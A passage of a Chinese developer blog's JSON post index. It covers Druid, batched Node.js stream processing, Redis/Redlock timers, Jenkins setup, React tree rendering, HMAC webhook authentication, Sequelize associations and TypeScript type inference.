压缩的位图索引来创建索引，以支持快速过滤和跨多列搜索。 基于时间的分区，Druid 首先按时间对数据进行分区，另外同时可以根据其他字段进行分区。这意味着基于时间的查询将仅访问与查询时间范围匹配的分区，这将大大提高基于时间的数据的性能。 近似算法，Druid 应用了近似 count-distinct，近似排序以及近似直方图和分位数计算的算法。这些算法占用有限的内存使用量，通常比精确计算要快得多。对于精度要求比速度更重要的场景，Druid 还提供了精确 count-distinct 和精确排序。 读取时自动汇总聚合，Druid 支持在数据读取阶段可选地进行数据汇总，这种汇总会部分预先聚合您的数据，并可以节省大量成本并提高性能。 使用 Druid 的场景？对于使用 Druid 比较好的场景： 数据插入频率比较高，但较少更新数据，例如用户的行为数据。 大多数查询场景为聚合查询和分组查询（GroupBy），同时还有一定得检索与扫描查询，例如中台的分析系统。 将数据查询延迟目标定位 100 毫秒到几秒钟之间。 数据具有时间属性（Druid 针对时间做了优化和设计），例如用户的行为数据。 在多表场景下，每次查询仅命中一个大的分布式表，查询又可能命中多个较小的 lookup 表。 场景中包含高基维度数据列（例如 URL，用户 ID 等），并且需要对其进行快速计数和排序。 需要从 Kafka、HDFS、对象存储（如 Amazon S3）中加载数据。 如果使用场景符合以下特征，那么使用 Druid 可能是一个不好的选择： 根据主键对现有数据进行低延迟更新操作。Druid支持流式插入，但不支持流式更新（更新操作是通过后台批处理作业完成，因为数据是分布式存储的） 延迟不重要的离线数据系统 场景中包括大连接（将一个大事实表连接到另一个大事实表），并且可以接受花费很长时间来完成这些查询。","categories":[{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/categories/大数据/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"},{"name":"Druid","slug":"Druid","permalink":"http://me.lizhooh.com/tags/Druid/"}]},{"title":"Nodejs 解决异步流读取的问题","slug":"Nodejs/Nodejs 解决异步流读取的问题","date":"2021-04-07T14:24:29.000Z","updated":"2021-06-15T06:10:52.841Z","comments":true,"path":"/stories/2021/04/Nodejs/Nodejs 解决异步流读取的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2021/04/Nodejs/Nodejs 解决异步流读取的问题/","excerpt":"","text":"前言Nodejs 支持流丰富的流接口，同时在操作流时允许用户进行暂停操作、转换操作，基于这些接口实现一种异步流的方式。 异步流：在读取一批数据时，停下来不读了，接下来进行一系列的异步操作，比如 IO 等。 业务需求： 有 100 多万的数据进行读取转换，通过 http 接口在 Nodejs 里读取。 如果不用流那么只能进行分批，分页操作，本身分页操作比较耗请求次数和查询性能，因此用流的方式实现。 如果直接用流，在内存里拼接数据，那么很快 Nodejs OM，这里改成异步流的方式实现。 http 流Nodejs 的流会在读一次时，读满一个 buffer 放在缓冲区了，这个大小不定，目前最多为 65534 字节。 http 接口返回的是 json 字符串，这里使用 got 请求，将 stream pipe 给一个自定义的 Transform。 根据文档，需要用户自己重写实现 _transform，也就是转换层。 123456789101112131415const &#123; Transform &#125; = require('stream')const got = require('got')class MyTransform extends Transform &#123; _transform(chunk, encoding, callback) &#123; // ... &#125;&#125;got.stream.post('http://127.0.0.1:8082/druid/v2/?pretty', &#123; responseType: 'json', json: &#123; // ... &#125;,&#125;).pipe(myTransForm) 每次流读取时，会到 _transform 里进行转换，拿到的 chunk 是一个不完整的 json 数据，等处理完成后调用 callback，继续读取下一个内容。 拿到的 chunk 不是一个完整的 json 字符串，因为流只会按照具体的字节数读取，看起来可能像： 12345678[ &#123; \"segmentId\": \"sss_1000-01-01T00:00:00.000Z_3000-01-01T00:00:00.000Z_0_1\", \"columns\": [ \"timestamp\", ], \"events\": [ [ 直接拼接如果数据量比较小时，可以直接拼接。 123456let jsonStr = ''class MyTransform extends Transform &#123; _transform(chunk, encoding, callback) &#123; jsonStr += chunk.toString() &#125;&#125; 但是，如果是上百万的数据量，Nodejs 分分钟 OM 给你看。 解决拼接问题这么怎么解析 json 和拼接呢？这里用到一个支持 stream 的 json 解析器：jsonparse，非常关键。 12345678910111213141516const Parser = require('jsonparse')const parser = new Parser()class MyTransform extends Transform &#123; _transform(chunk, encoding, callback) &#123; // const data = chunk.toString() parser.write(chunk) &#125;&#125;// write 写入之后得到一个结果parser.onValue = function (value) &#123; // console.log(value) // console.log(this.stack) // console.log(this.key)&#125; jsonparse 拿到流的数据进行解析，它会自动分析当前的数据解析，等它觉得满足至少一项的数据结构时，jsonparse 就会触发 onValue。 后可以进行分批处理，然后在批任务里做你的异步任务，比例写数据到 Mongodb 里。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class MyTransform extends Transform &#123; constructor(&#123; batchSize = 100, onTask &#125;) &#123; super() const self = this this.onTask = onTask || (e =&gt; e) this.batchSize = batchSize this.cache = [] // 缓存数据，转换好的数据 this.events = [] // 数据列表 this.columns = [] // 数据列名 this.parser = new Parser() this.parser.onValue = function (value) &#123; if (this.key === 'events' &amp;&amp; Array.isArray(value)) &#123; self.events.push(...value) &#125; if (this.key === 'columns' &amp;&amp; Array.isArray(value) &amp;&amp; self.columns.length === 0) &#123; self.columns = value &#125; &#125; &#125; // 这里需要定制化 converter() &#123; const list = this.events.map((item) =&gt; this.columns.reduce((obj, key, index) =&gt; (&#123; ...obj, [key]: item[index] &#125;), &#123;&#125;)) return list &#125; // 重写自定义的转化流的 _transform 方法 _transform(chunk, encoding, callback) &#123; // const data = chunk.toString() this.parser.write(chunk) // 压到缓存中 this.cache = [].concat(this.cache, this.converter()) this.events = [] // TODO: 如果等于批数，直接消费 if (this.cache.length === this.batchSize) &#123; this.onTask(this.cache).then(callback).catch(callback) this.cache = [] return &#125; // TODO: 如果小于批量，先缓存 if (this.cache.length &lt; this.batchSize) &#123; callback() return &#125; // TODO: 超过批量，再分批 (async () =&gt; &#123; const L = this.cache.length / this.batchSize const len = Math.floor(L) // 向下取整 for (let i = 0; i &lt; len; i++) &#123; const list = this.cache.slice(i * this.batchSize, (i + 1) * this.batchSize) try &#123; await this.onTask(list) &#125; catch (err) &#123; console.log(err) &#125; &#125; this.cache = this.cache.slice(len * this.batchSize) callback() &#125;)() &#125; _flush(callback) &#123; if (this.cache.length &gt; 0) &#123; this.onTask(this.cache) // 消费剩下的数据 &#125; this.cache = [] this.columns = [] this.events = [] callback() &#125;&#125; 这样就可以实现异步流，并且是分批操作。 123456const myTransForm = new MyTransform(&#123; batchSize: 100, onTask: async (list = []) =&gt; &#123; await Model.insertMany(list) &#125;&#125;)","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"分布式定时器 Redis TTL + Redlock 实现","slug":"Redis/分布式定时器 Redis TTL + Redlock 实现","date":"2021-03-02T14:20:45.000Z","updated":"2021-06-15T06:10:52.890Z","comments":true,"path":"/stories/2021/03/Redis/分布式定时器 Redis TTL + Redlock 实现/","link":"","permalink":"http://me.lizhooh.com/stories/2021/03/Redis/分布式定时器 Redis TTL + Redlock 实现/","excerpt":"","text":"前言哦，分布式定时器，node 端部署多台物理机器，做负载和高可用，同时单台物理机器又做了多进程的负载均衡架构。 整体思路： 使用 redis 作为中间状态层。 使用 redlock 进行上锁，避免分布式多次触发的问题。 基于 redis 过期键基于 redis 过期键实现的状态中间层，redis 负责定时状态的缓存和定时功能，由于 redis 有过期键的订阅发布模式，因此可以很方便的用到做定时器功能。 在 redis 设置一个 TTL，以秒为单位，进行定时。在 nodejs 上进行监听过期键： 1234// 开启redis的键空间通知// E：表示 keyevent 事件，有这个字母表示会往 __keyevent@&lt;db&gt;__ 频道推消息。// x: 过期事件：某个key刚好过期的这个时间点触发的事件subscriber.config(\"SET\", \"notify-keyspace-events\", \"Ex\"); 订阅通道： 1234567// 订阅一个key过期的通知频道DB:subscriber.once(\"connect\", () =&gt; &#123; subscriber.select(DB_NUMBER, (err) =&gt; &#123; // 订阅 Key 过期（定时任务）事件消息通道 subscriber.subscribe(`__keyevent@$&#123;DB_NUMBER&#125;__:expired`); &#125;);&#125;); 注意需要专门连接一个订阅通道的 redis： 12client = new Redis(redisOptions);subscriber = new Redis(redisOptions); 使用 redlock 进行加锁说到加锁，其实就是分布式应用的一个特点，用于避免重复执行的问题。因此在具体执行阶段需要多第一个执行者进行加锁，其他人收到消息时需要先申请锁，如果拿不到则放弃执行。 redlock 是专门用于 redis 上的算法：https://redis.io/topics/distlock 1234import Redlock from 'redlock'client = new Redis(redisOptions)redlock = new Redlock([client], &#123; retryCount: 0 &#125;) 按照官方的写法，初始化锁时需要指定客户端。 那么怎么用呢？需要在监听的回调里进行判断： 123456789redlock .lock(key, ttl) .then(lock =&gt; &#123; // 释放锁 lock.unlock() &#125;) .catch(err =&gt; &#123; // ... &#125;) 这样一来，要看谁的 redlock.lock 调用的先，先调用者先获得锁，执行完成相关逻辑后再释放锁。 潜在缺陷无法避免两个问题：1、异步数据丢失。2、脑裂问题。","categories":[{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/categories/Redis/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"NoSQL","slug":"NoSQL","permalink":"http://me.lizhooh.com/tags/NoSQL/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redis","slug":"Redis","permalink":"http://me.lizhooh.com/tags/Redis/"}]},{"title":"使用 Jenkins 进行前端自动部署（使用记录）","slug":"前端/使用 Jenkins 进行前端自动部署（使用记录）","date":"2021-02-07T14:19:46.000Z","updated":"2021-06-15T06:10:52.906Z","comments":true,"path":"/stories/2021/02/前端/使用 Jenkins 进行前端自动部署（使用记录）/","link":"","permalink":"http://me.lizhooh.com/stories/2021/02/前端/使用 Jenkins 进行前端自动部署（使用记录）/","excerpt":"前言Jenkins 是开源 CI/CD 软件领导者， 提供超过 1000 个插件来支持构建、部署、自动化， 满足任何项目的需要。","text":"前言Jenkins 是开源 CI/CD 软件领导者， 提供超过 1000 个插件来支持构建、部署、自动化， 满足任何项目的需要。 安装在这里选择对应系统的安装包：https://jenkins.io/zh/download/参考这篇文章在 window 上安装：https://jenkins.io/zh/blog/2019/02/01/windows-installers/ 安装完成后会自动启动服务（jenkins.exe），打开：http://127.0.0.1:8080/login，这时候安装提示完成相关过程即可。 完成之后会进入首页，可以看到没有任何的工作任务。 配置 Nodejs 插件打开插件：系统管理 -&gt; 插件管理。 如果不幸看到以下情景，问题出现在网络上。 那么点击 advanced，在 Update Site 里把 url 更换为：http://mirror.xmission.com/jenkins/updates/update-center.json。 如果插件列表为空，打开 Nodejs 插件：https://plugins.jenkins.io/nodejs。 下载 nodejs.hpi，在 advanced 里上传文件即可。 安装成功的标志： 接着在 系统管理 -&gt; 全局工具配置，配置 Nodejs 的版本。 创建 Nodejs 工作任务选择 newJob，输入名称，现在自由风格的项目，开始进入配置。 编辑编译时的命令。 参考资料 https://jenkins.io/zh/","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"高效的前端 Tree 结构渲染与读取算法","slug":"前端/高效的前端 Tree 结构渲染与读取算法","date":"2020-10-08T11:49:45.000Z","updated":"2021-06-15T06:10:52.908Z","comments":true,"path":"/stories/2020/10/前端/高效的前端 Tree 结构渲染与读取算法/","link":"","permalink":"http://me.lizhooh.com/stories/2020/10/前端/高效的前端 Tree 结构渲染与读取算法/","excerpt":"前言前端最烦的是渲染树结构了，单纯渲染树结构还行，直接一个递归渲染即可，最怕渲染之后各种修改数据，主要是麻烦。 最后，不断渲染树结构的提炼，发现了一种可以很搞笑的渲染与读取的算法，好吧根本不是正规算法，是我 YY 的。","text":"前言前端最烦的是渲染树结构了，单纯渲染树结构还行，直接一个递归渲染即可，最怕渲染之后各种修改数据，主要是麻烦。 最后，不断渲染树结构的提炼，发现了一种可以很搞笑的渲染与读取的算法，好吧根本不是正规算法，是我 YY 的。 常规递归渲染在 React 里渲染一个树结构的界面，假设树的数据为： 12345678910111213141516171819202122232425262728293031const tree = [ &#123; id: 1, titie: 'node1', pid: null, children: [ &#123; id: 3, titie: 'node3', pid: 1, &#125;, &#123; id: 4, titie: 'node4', pid: 1, children: [ &#123; id: 5, titie: 'node5', pid: 4, &#125; ] &#125;, ] &#125;, &#123; id: 2, titie: 'node2', pid: null, &#125;,] 渲染树结构有几个必须的要点：pid 和 children。用 pid 表达父级的 id，或者用 parent 表达父节点的引用，用 children 表达直接的数组。 一般后端会给一个扁平化的数组列表给你，前端自己组装成 tree 结构，具体怎么组装就不说了，有个 array-to-tree 的库可以解决。 拿到这个 tree 结构后，这时前端的渲染时这样的： 12345678910111213// 递归渲染树const renderNodeTree = (list: INode[], pNode?: INode) =&gt; ( &lt;ul&gt; &#123;list.map(item =&gt; ( &lt;li key=&#123;item.id&#125;&gt; &lt;span onClick=&#123;onItemClick(item)&#125;&gt; &#123;item.title&#125; &lt;/span&gt; &#123;item.children &amp;&amp; renderNodeTree(item.children, item)&#125; &lt;/li&gt; ))&#125; &lt;/ul&gt;) 是的，采用递归渲染的方式，在 React 里很容易实现，在 Vue 里我就不知道怎么实现了。 但是这样有一个问题，当点击某个节点时，对这个节点的 title 进行修改，前端有两种做法： 副作用修改，自己对这个节点的引用进行修改： 123const onItemClick = item =&gt; e =&gt; &#123; item.title = 'abc'&#125; 修改起来极其简单，但是这样会面临一个问题就是副作用的问题，除法你的 tree 从 props 传进来做了 deepcopy。 递归到目标节点替换一个新的对象，写起来有点蛋疼，用 loadash 的 set，这里不列出代码。 改良算法我的改良想法是，从后端拿到扁平化的数组后（raw），创建一个字典。 123456789101112/** * 将数组转成字典结构 * @param list * @param key * @param selector */export const toDictionary = (list, key, selector): &#123; [k: string]: any &#125; =&gt; &#123; return list.reduce((obj, val) =&gt; (&#123; ...obj, [val[key]]: selector ? selector(val) : val &#125;), &#123;&#125;)&#125; 上面的树结构原生数据是： 1234567const raw = [ &#123; id: 1, title: 'node1', pid: null &#125;, &#123; id: 2, title: 'node2', pid: null &#125;, &#123; id: 3, title: 'node3', pid: 1 &#125;, &#123; id: 4, title: 'node4', pid: 1 &#125;, &#123; id: 5, title: 'node5', pid: 4 &#125;,] 打一个字典之后变成： 1234567const dictionary = &#123; 1: &#123; id: 1, title: 'node1', pid: null &#125;, 2: &#123; id: 2, title: 'node2', pid: null &#125;, 3: &#123; id: 3, title: 'node3', pid: 1 &#125;, 4: &#123; id: 4, title: 'node4', pid: 1 &#125;, 5: &#123; id: 5, title: 'node5', pid: 4 &#125;,&#125; 接下来，是前端的渲染问题，没办法前端必须用 tree 结构渲染，但是这时只创建一个 id 节点的树。 1234const tree = [ &#123; id: 1, children: [&#123; id: 3 &#125;, &#123; id: 4, children: [&#123; id: 5 &#125;] &#125;] &#125;, &#123; id: 2 &#125;] 是的看起来很简洁，那么渲染的时候变成这样了： 12345678910111213// 递归渲染树const renderNodeTree = (list: INode[], pNode?: INode) =&gt; ( &lt;ul&gt; &#123;list.map(item =&gt; ( &lt;li key=&#123;item.id&#125;&gt; &lt;span onClick=&#123;onItemClick(item)&#125;&gt; &#123;dictionary[item.id].title&#125; &lt;/span&gt; &#123;item.children &amp;&amp; renderNodeTree(item.children, item)&#125; &lt;/li&gt; ))&#125; &lt;/ul&gt;) 当点击某个节点时，对这个节点的 title 进行修改，就是这么简单： 12345678const onItemClick = item = e =&gt; &#123; // 当然也可以直接副作用，这里的副作用影响非常小 dictionary[item.id] = &#123; ...dictionary[item.id], title: 'abc' &#125; setDictionary(&#123; ...dictionary &#125;)&#125; 面对新的需求好，接下来来点更高级的需求就是，当子节点全选时，父节点要被自动选。 这时，字典的数据格式为： 1234567const dictionary = &#123; 1: &#123; id: 1, title: 'node1', pid: null, checked: false &#125;, 2: &#123; id: 2, title: 'node2', pid: null, checked: false &#125;, 3: &#123; id: 3, title: 'node3', pid: 1, checked: false &#125;, 4: &#123; id: 4, title: 'node4', pid: 1, checked: false &#125;, 5: &#123; id: 5, title: 'node5', pid: 4, checked: false &#125;,&#125; 用一个 checked 标识是否被选中了。 实现的关键点在于统计父级下的子节点选中的数量问题。 123456789101112131415161718192021const onItemClick = item = e =&gt; &#123; if (dictionary[item.id].pid === null) return dictionary[item.id] = !item.checked const arr = [] Object.values(dictionary).forEach(node =&gt; &#123; if (node.pid === dictionary[item.id].pid) &#123; arr.push(node) &#125; &#125;) const all = arr.length const count = arr.filter(i =&gt; i.checked).length if (count === all) &#123; // 更新父节点的 checked，随便缓存一下计算的个数 dictionary[item.pid].checked = true dictionary[item.pid].all = all dictionary[item.pid].count = count &#125; setDictionary(&#123; ...dictionary &#125;)&#125; 因为 dictionary 是字典结构，所以读取，遍历都非常方便，不像树结构，需要用递归遍历。","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"可信的 http 服务互调鉴权","slug":"Nodejs/可信的 http 服务互调鉴权","date":"2020-10-07T13:01:34.000Z","updated":"2021-06-15T06:10:52.843Z","comments":true,"path":"/stories/2020/10/Nodejs/可信的 http 服务互调鉴权/","link":"","permalink":"http://me.lizhooh.com/stories/2020/10/Nodejs/可信的 http 服务互调鉴权/","excerpt":"前言场景，A 服务是自家服务，B 服务是合作的第三方公司的服务。现在要做的是 A 服务对 B 服务发起请求，B 服务执行完成后，会异步的进行回调，对回调的 http 地址发起回调的内容请求。这样就来了一个问题，A 和 B 怎么确保是对方发送的请求？ 可以什么都不做，这样的风险被人抓包挖出地址后不断的轰炸。当然是需要做鉴权功能。","text":"前言场景，A 服务是自家服务，B 服务是合作的第三方公司的服务。现在要做的是 A 服务对 B 服务发起请求，B 服务执行完成后，会异步的进行回调，对回调的 http 地址发起回调的内容请求。这样就来了一个问题，A 和 B 怎么确保是对方发送的请求？ 可以什么都不做，这样的风险被人抓包挖出地址后不断的轰炸。当然是需要做鉴权功能。 异步回调有些服务是在收到请求后不能立刻处理完成，例如离线的计算任务，异步的计算任务，这种当然不能立刻告诉你结果，可能在未来几秒，几分钟后才计算完，把结果告诉你。那么具体怎么告诉法呢？当你请求时，需要携带回调的地址，计算完成后对这个地址进行请求，这样就构成了一个异步回调的形式。 鉴权首先，鉴权存在加密的过程，是一个不可逆加密，密钥双发都知道，加密内容可以是一个可刷新的动态值。 这里举出 HmacSHA1 的加密形式。 在 A 向 B 发起计算的请求时，在 header 里携带鉴权信息。 12'x-sg-token': 'xxxx','x-sg-signature': 'P76xYs3puRoSWnx4cniypoU0K6v1PeHk9bEzdRUw' 当然有一个固定 key 是不携带在 header 里的，而是写死在代码里。 其中 x-sg-key 是固定已知值（可看 webhook 的配置得知），需要你的服务记忆住，x-sg-token 是可刷新值，每次发起推送请求时在 header 里携带。 在加密完成后，你需要用你生成的 signature 与 header 里的 x-sg-signature 进行比较来确定是 A 服务器发送的请求。同理，在 B 执行回调请求时，A 也会做同样的鉴权操作。 1234567891011121314151617const request = require('request');const options = &#123; method: 'POST', url: 'http://xxx.com', // replyUrl 地址 headers: &#123; 'content-type': 'application/json', 'x-sg-token': 'xxxx', 'x-sg-signature': '076xYs3puuoSWnx4cniypoU0K6v1SeHk9bEzdRUw' &#125;, body: [], json: true&#125;;request(options, function (error, response, body) &#123; if (error) throw new Error(error); console.log(body);&#125;); 在 B 服务里需要对加密进行验证，怎么验证？对 x-sg-key 和 x-sg-token 进行 HmacSHA1 加密，得到了 signature 与 header 的 x-sg-signature 进行比较，如果相同则是受信用户，否则这个请求会被抛弃。 1234567const hmacsha1 = require('hmacsha1');const key = 'sugo_data'const token = 'xxxx'const signature = hmacsha1(key, token);console.log(signature) 小结当然除了这种 http 回调的方式来实现异步的消息指令，其实还可以根据 redis pub/sub 的模式来实现，在 A 发起请求时把 redis 的地址，还有监听的 key 告诉 B 服务，B 服务在计算完成后对 key 进行 pub，在 A 服务里监听到时触发，获取 key 的值得到回调内容。但是这种方式仅限于内部公司用吧，外部公司，如果不想让别人直接访问你的 redis 可不能这样干之。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Sequelize 解决中间表字段累赘的问题","slug":"Mysql/Sequelize 解决中间表字段累赘的问题","date":"2020-09-05T12:32:53.000Z","updated":"2021-06-15T06:10:52.830Z","comments":true,"path":"/stories/2020/09/Mysql/Sequelize 解决中间表字段累赘的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2020/09/Mysql/Sequelize 解决中间表字段累赘的问题/","excerpt":"前言Sequelize 如果是创建 N : M 关联，自动创建关联表就没有出现中间表字段累赘的问题，但是如果是自动创建中间关联表又不满足业务需求，因为中间不仅只存关联的两个表的信息，还有其他信息要存储。这样一来，就手动创建呗。 手动创建就出现了一个中间表字段累赘的问题，具体表现看下面。","text":"前言Sequelize 如果是创建 N : M 关联，自动创建关联表就没有出现中间表字段累赘的问题，但是如果是自动创建中间关联表又不满足业务需求，因为中间不仅只存关联的两个表的信息，还有其他信息要存储。这样一来，就手动创建呗。 手动创建就出现了一个中间表字段累赘的问题，具体表现看下面。 解决方案这里的累赘是指查询出来时多了一层嵌套，而不是数据库的累赘。目前想到的解决方案是基于虚拟字段来实现。 以下示例代码使用 sequelize 和 sequelize-typescript 编写。 Sequelize 关联中间表会出现数据累赘的问题，何为累赘，看一下的模型定义： 12@HasMany(() =&gt; UserGroupsMeasureModel, 'userGroupsId')userGroupsMeasures: UserGroupsMeasureModel[] 说明： 这里定义了一个一对多关联，字段为 userGroupsMeasures。 UserGroupsMeasureModel 是一个中间表，其关联着 MeasureModel 表。 因为 UserGroups 会有多个 Measure，因此采用了中间表的形式。 查询列表时： 123456789101112&#123; include: [ &#123; model: UserGroupsMeasureModel, attributes: ['id', 'count', 'index'], include: [&#123; model: MeasureModel, attributes: ['id', 'name', 'showFormat', 'styName'] &#125;] &#125;, ]&#125; 查询列表生成的结构，这样一来前端就有意见了，能不嵌套这么深吗？ 出现这种问题的原因是 Sequelize 并不知你要显示哪些格式，而是按照中间表的关联结构来输出格式，因此就输出这些格式了。 1234567891011121314151617181920212223\"userGroupsMeasures\": [ &#123; \"id\": \"ebPGLfO0m3k\", \"count\": 0, \"index\": 0, \"measure\": &#123; \"id\": \"Zymh8VklnS\", \"name\": \"哈哈14\", \"styName\": \"da231313z_h01st2kchtg\" &#125; &#125;, &#123; \"id\": \"DwfPFuKT0Ph\", \"count\": 0, \"index\": 1, \"measure\": &#123; \"id\": \"94Co7H05U\", \"name\": \"哈哈 1\", \"styName\": \"da231313z_asdasd\" &#125; &#125; &#125;], 那么前端想要这样的结构呢？怎么愉快并且可维护性的实现？下面使用 getter 和虚拟字段来实现。 Sequelize 的虚拟字段并不会在数据库里面生成： 12345678910111213141516@HasMany(() =&gt; UserGroupsMeasureModel, 'userGroupsId')userGroupsMeasures: UserGroupsMeasureModel[]@Column(&#123; type: DataType.VIRTUAL, comment: '指标虚拟字段'&#125;)get measures() &#123; return this.userGroupsMeasures.map((i) =&gt; (&#123; id: i.measure.id, name: i.measure.name, index: i.index, count: i.count, styName: i.measure.styName &#125;))&#125; 查询列表时，把 userGroupsMeasures 过滤了即可。 123456attributes: &#123; exclude: [ 'deletedAt', 'updatedAt', 'params', 'excludeParams', 'userGroupsMeasures', 'userGroupsTags' ]&#125;, 最后查出来的格式是这样的： 12345678910111213141516\"measures\": [ &#123; \"id\": \"Zymh8VklnS\", \"name\": \"哈哈14\", \"index\": 0, \"count\": 0, \"styName\": \"da231313z_h01st2kchtg\" &#125;, &#123; \"id\": \"94Co7H05U\", \"name\": \"哈哈 1\", \"index\": 1, \"count\": 0, \"styName\": \"da231313z_asdasd\" &#125;],","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://me.lizhooh.com/tags/MongoDB/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"Typescript 一些高级的类型推断","slug":"Typescript/Typescript 一些高级的类型推断","date":"2020-08-09T14:05:10.000Z","updated":"2021-06-15T06:10:52.896Z","comments":true,"path":"/stories/2020/08/Typescript/Typescript 一些高级的类型推断/","link":"","permalink":"http://me.lizhooh.com/stories/2020/08/Typescript/Typescript 一些高级的类型推断/","excerpt":"","text":"前言有时候想要做一些高级的推断，发现不行，现在只能这样做了。 介绍有一个对象 M： 12345678const m = &#123; reducers: &#123; add() &#123;&#125; &#125;, effects: &#123; asyncAdd() &#123;&#125; &#125;&#125; 想获取其类型，很简单： 1type M = typeof m 如果想获取 reducers 和 effects 的类型呢？也很简单： 12type Effects = M['effects']type Reducers = M['reducers'] 如果想写成泛型呢？ 1type Effects&lt;T&gt; = T['effects'] 不好意思，这样写会报错，原因在于 T 的约束性问题。那么如何解决？使用 like。 123456type LikeM = &#123; reducers: any, effects: any&#125;type Effects&lt;T&gt; = T extends LikeM ? T['effects'] : any 好这样就能成功推断出来了。","categories":[{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/categories/Typescript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Typescript","slug":"Typescript","permalink":"http://me.lizhooh.com/tags/Typescript/"}]},{"title":"关于 Sequelize Tree 结构的问题","slug":"Mysql/关于 Sequelize Tree 结构的问题","date":"2020-07-27T13:42:14.000Z","updated":"2021-06-15T06:10:52.830Z","comments":true,"path":"/stories/2020/07/Mysql/关于 Sequelize Tree 结构的问题/","link":"","permalink":"http://me.lizhooh.com/stories/2020/07/Mysql/关于 Sequelize Tree 结构的问题/","excerpt":"前言今天碰到关于 Sequelize Tree 结构的问题 … 业务需求需要存储一个 Tree 结构，因为数据库是关系型数据库，存储方面采用 pid 关联的方式。 这是数据库存的数据格式： 123456const row = [ &#123; id: 1, title: '节点一', pid: null &#125;, &#123; id: 2, title: '节点二', pid: 1 &#125;, &#123; id: 3, title: '节点三', pid: 1 &#125;, &#123; id: 4, title: '节点四', pid: 2 &#125;,];","text":"前言今天碰到关于 Sequelize Tree 结构的问题 … 业务需求需要存储一个 Tree 结构，因为数据库是关系型数据库，存储方面采用 pid 关联的方式。 这是数据库存的数据格式： 123456const row = [ &#123; id: 1, title: '节点一', pid: null &#125;, &#123; id: 2, title: '节点二', pid: 1 &#125;, &#123; id: 3, title: '节点三', pid: 1 &#125;, &#123; id: 4, title: '节点四', pid: 2 &#125;,]; 后面需要转成前端渲染的多维结构： 12345678const tree = [ &#123; id: 1, title: '节点一', pid: null, children: [ &#123; id: 2, title: '节点二', pid: 1, children: [ &#123; id: 4, title: '节点四', pid: 2 &#125; ] &#125;, &#123; id: 3, title: '节点三', pid: 1 &#125;, ] &#125;]; 好，那么在 Sequelize 里怎么写？ 代码实现下面来看看如何用 Sequelize 实现逻辑代码。 创建模型首先创建一个 Node 模型： 1234const Node = sequelize.define('node', &#123; title: DataTypes.STRING, level: DataTypes.INTEGER,&#125;, config); 设置关联关系设置关联，主要是跟自己关联： 12// 关联父级Node.belongsTo(Node, &#123; foreignKey: 'pid', as: 'parent' &#125;); 逻辑代码实现先创建一系列的节点： 123456const node1 = await Node.create(&#123; title: '节点 1', level: 0 &#125;);const node2 = await Node.create(&#123; title: '节点 2', level: 1 &#125;);const node3 = await Node.create(&#123; title: '节点 3', level: 1 &#125;);const node4 = await Node.create(&#123; title: '节点 4', level: 2 &#125;);const node5 = await Node.create(&#123; title: '节点 5', level: 2 &#125;);const node6 = await Node.create(&#123; title: '节点 6', level: 3 &#125;); 之后，设置每个节点之间的关系： 123456// 设置 node2 节点的父级为 node1await node2.setParent(node1);await node3.setParent(node1);await node4.setParent(node2);await node5.setParent(node2);await node6.setParent(node3); 节点的列表查询： 1const nodeList = await Node.findAll(); 查询的结果： 12345678[ &#123; \"id\": 1, \"title\": \"节点 1\", \"level\": 0, \"pid\": null &#125;, &#123; \"id\": 2, \"title\": \"节点 2\", \"level\": 1, \"pid\": 1 &#125;, &#123; \"id\": 3, \"title\": \"节点 3\", \"level\": 1, \"pid\": 1 &#125;, &#123; \"id\": 4, \"title\": \"节点 4\", \"level\": 2, \"pid\": 2 &#125;, &#123; \"id\": 5, \"title\": \"节点 5\", \"level\": 2, \"pid\": 2 &#125;, &#123; \"id\": 6, \"title\": \"节点 6\", \"level\": 3, \"pid\": 3 &#125;] 好的，之后考虑怎么进行转换了。 123456789101112131415161718192021222324252627function createTree(params) &#123; function findByIdAndAddChildren(list, id, data, level = 1) &#123; // pid 为 null，压到顶层 if (data.pid === null) &#123; const l = 0; return [...list, data]; &#125; for (let i = 0; i &lt; list.length; i++) &#123; const item = list[i]; // 找到节点了 if (item.id === id) &#123; if 